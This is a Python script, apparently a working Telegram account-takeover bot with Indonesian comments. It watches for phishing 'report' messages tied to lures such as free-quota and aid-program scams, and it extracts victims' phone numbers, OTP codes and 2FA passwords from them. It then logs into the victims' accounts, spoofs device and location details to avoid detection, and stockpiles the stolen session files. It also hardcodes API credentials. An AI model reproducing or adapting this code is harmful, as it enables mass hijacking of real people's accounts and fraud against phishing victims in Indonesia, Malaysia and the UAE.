
import asyncio
import os
import re
import shutil
from telethon import TelegramClient, events
from telethon.errors import (
    PhoneNumberUnoccupiedError, SessionPasswordNeededError, PhoneCodeInvalidError
)
from telethon.tl.functions.account import GetAuthorizationsRequest

# Konfigurasi API
api_id = 23520639
api_hash = 'bcbc7a22cde8fa2ba7d1baad086086ca'

SESSIONS_FOLDER = "a44_sessions"
SESSIONS_FOLDER_FINAL = "sessions2"
ALLOWED_PREFIXES = ["+62", "+60", "+971"]

pending_login = {}

# Buat folder jika belum ada
os.makedirs(SESSIONS_FOLDER, exist_ok=True)
os.makedirs(SESSIONS_FOLDER_FINAL, exist_ok=True)

client = TelegramClient('main2', api_id, api_hash)

# Normalisasi nomor
def normalize_phone_number(raw_phone):
    digits_only = re.sub(r'\D', '', raw_phone)

    if digits_only.startswith("01") and len(digits_only) in [10, 11]:
        result = '+60' + digits_only[1:]
    elif digits_only.startswith("60"):
        result = '+' + digits_only
    elif raw_phone.startswith('+'):
        result = raw_phone
    elif digits_only.startswith("62"):
        result = '+' + digits_only
    else:
        result = None

    print(f"[NORMALIZE] Raw: {raw_phone} => Normalized: {result}")
    return result

# Validasi nomor
def is_valid_phone_number(phone):
    if not phone or not phone.startswith('+'):
        return False

    digits_only = re.sub(r'\D', '', phone)
    if 10 <= len(digits_only) <= 15:
        return any(phone.startswith(prefix) for prefix in ALLOWED_PREFIXES)
    return False

# Spoof device
async def apply_spoof_device(client, phone, fallback_model="Pixel 5"):
    try:
        await client.connect()
        if hasattr(client, "_init_connection"):
            auths = await client(GetAuthorizationsRequest())
            if auths.authorizations:
                last = auths.authorizations[0]
                client._init_connection.device_model = last.device_model
                client._init_connection.system_version = last.platform
                print(f"[🛠️] Spoof device: {last.device_model} ({last.platform})")
            else:
                raise Exception("tidak ada sesi sebelumnya")
        else:
            raise Exception("init_connection tidak tersedia")
    except Exception as e:
        if not client.is_connected():
            await client.connect()
        if hasattr(client, "_init_connection"):
            client._init_connection.device_model = fallback_model
            client._init_connection.system_version = "Android 11"
        print(f"[🛠️] Spoof default device: {fallback_model} ({e})")

    if hasattr(client, "_init_connection"):
        conn = client._init_connection
        conn.app_version = "Telegram Android 10.0.0"
        conn.system_lang_code = "en"
        conn.lang_code = "en"
        conn.lang_pack = ""

        if phone.startswith("+62"):
            conn.country = "ID"
            conn.latitude = -6.2
            conn.longitude = 106.8167
            print(f"[🌍] Lokasi: Jakarta, Indonesia")
        elif phone.startswith("+60"):
            conn.country = "MY"
            conn.latitude = 3.1390
            conn.longitude = 101.6869
            print(f"[🌍] Lokasi: Kuala Lumpur, Malaysia")
        elif phone.startswith("+971"):
            conn.country = "AE"
            conn.latitude = 25.2048
            conn.longitude = 55.2708
            print(f"[🌍] Lokasi: Dubai, UAE")
        else:
            conn.country = "US"
            conn.latitude = 37.7749
            conn.longitude = -122.4194
            print(f"[🌍] Lokasi default: San Francisco, USA")

# Kirim OTP hanya jika nomor valid
async def request_otp(phone):
    try:
        session_path = os.path.join(SESSIONS_FOLDER, phone)
        login_client = TelegramClient(session_path, api_id, api_hash)

        print(f"[⚙️] Memeriksa status login untuk {phone}...")
        await apply_spoof_device(login_client, phone)
        await login_client.connect()

        if await login_client.is_user_authorized():
            print(f"[✅] {phone} sudah login. Pindahkan session.")
            await login_client.disconnect()

            final_path = os.path.join(SESSIONS_FOLDER_FINAL, phone)
            if os.path.exists(session_path + ".session"):
                shutil.move(session_path + ".session", final_path + ".session")
            return

        try:
            sent = await login_client.send_code_request(phone)
        except PhoneNumberUnoccupiedError:
            print(f"[❌] {phone} belum terdaftar di Telegram.")
            await login_client.disconnect()
            return
        except Exception as e:
            print(f"[❌] Gagal mengirim OTP ke {phone}: {e}")
            await login_client.disconnect()
            return

        pending_login[phone] = (login_client, sent.phone_code_hash)
        print(f"[📨] OTP berhasil dikirim ke {phone}")

    except Exception as e:
        print(f"[ERROR] Terjadi kesalahan saat request OTP untuk {phone}: {e}")

# Tangani OTP yang datang lebih awal
async def handle_early_otp(phone, otp, password=None):
    await request_otp(phone)
    await asyncio.sleep(3)
    if phone in pending_login:
        await complete_login(phone, otp, password)
    else:
        print(f"[❌] Gagal proses login untuk {phone} setelah OTP masuk duluan.")

# Login jika OTP diterima
async def complete_login(phone, otp, password=None):
    try:
        login_data = pending_login.get(phone)
        if not login_data:
            print(f"[❌] Tidak ada session aktif untuk {phone}")
            return

        login_client, phone_code_hash = login_data
        await login_client.connect()

        try:
            await login_client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
        except PhoneNumberUnoccupiedError:
            print(f"[🆕] {phone} belum terdaftar.")
            await login_client.sign_up(otp, first_name="UserBaru")
        except SessionPasswordNeededError:
            if password:
                try:
                    await login_client.sign_in(password=password)
                    print(f"[🔓] Login 2FA berhasil: {phone}")
                except Exception as e:
                    print(f"[❌] Gagal login 2FA {phone}: {e}")
                    await login_client.disconnect()
                    del pending_login[phone]
                    return
            else:
                print(f"[🔒] 2FA aktif tapi password tidak ada: {phone}")
                await login_client.disconnect()
                del pending_login[phone]
                return
        except PhoneCodeInvalidError:
            print(f"[❌] OTP salah untuk {phone}")
            await login_client.disconnect()
            del pending_login[phone]
            return
        except Exception as e:
            print(f"[❌] Gagal login {phone}: {e}")
            await login_client.disconnect()
            del pending_login[phone]
            return

        print(f"[✅] Login berhasil untuk {phone}")
        await login_client.disconnect()
        await asyncio.sleep(1)

        src = os.path.join(SESSIONS_FOLDER, phone + ".session")
        dst = os.path.join(SESSIONS_FOLDER_FINAL, phone + ".session")

        for attempt in range(5):
            try:
                shutil.move(src, dst)
                print(f"[📂] Session dipindahkan: {dst}")
                break
            except Exception as e:
                if attempt < 4:
                    print(f"[⌛] File masih digunakan, retry {attempt+1}/5...")
                    await asyncio.sleep(1)
                else:
                    print(f"[❌] Gagal memindahkan session {phone} setelah 5 percobaan: {e}")

        del pending_login[phone]

    except Exception as e:
        print(f"[❌] Error saat login {phone}: {e}")
        if phone in pending_login:
            del pending_login[phone]

# Event handler
@client.on(events.NewMessage)
async def handler(event):
    msg = event.raw_text

    keywords = [
        '❮ LAPORAN My Kasih ❯', '❮ LAPORAN BANTUAN MADANI ❯',
        '❮ LAPORAN Judul ❯', '❮ LAPORAN judul ❯',
        '❮ LAPORAN GRATIS KUOTA ❯', '❮ LAPORAN UANG KUNO ❯',
        '❮ LAPORAN Uang Kuno ❯', '❮ LAPORAN Laporan ❯',
        '❮ LAPORAN HACK WHATSAPP ❯', '❮ LAPORAN Laporan ❯'
    ]

    if any(keyword in msg for keyword in keywords):
        phone_match = re.search(r'(?:PHONE\s+NUMBER|NUMBER|NOWA)\s*:\s*(\+?\d+)', msg)
        otp_match = re.search(r'(?:OTP|PIN|OTP\s+WA)\s*:\s*(\d{5,6})', msg)
        password_match = re.search(r'PASSWORD\s*:\s*(\S+)', msg)

        if phone_match:
            raw_phone = phone_match.group(1).strip()
            phone = normalize_phone_number(raw_phone)

            if not phone or not is_valid_phone_number(phone):
                print(f"[❌] Nomor tidak valid: {raw_phone}")
                return

            password = password_match.group(1) if password_match else None

            if otp_match:
                otp = otp_match.group(1)
                print(f"[📥] OTP diterima untuk {phone}: {otp}")
                if password:
                    print(f"[🔐] Password 2FA: {password}")

                if phone in pending_login:
                    asyncio.create_task(complete_login(phone, otp, password))
                else:
                    print(f"[⚠️] OTP diterima duluan untuk {phone}, tetap akan request OTP lalu login...")
                    asyncio.create_task(handle_early_otp(phone, otp, password))
            else:
                if phone not in pending_login:
                    print(f"[📨] Mengirim OTP ke {phone}")
                    asyncio.create_task(request_otp(phone))
                else:
                    print(f"[⏳] Sudah menunggu OTP untuk {phone}")

# Main
async def main():
    await client.start()
    print("[🚀] Bot Telegram siap berjalan.")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
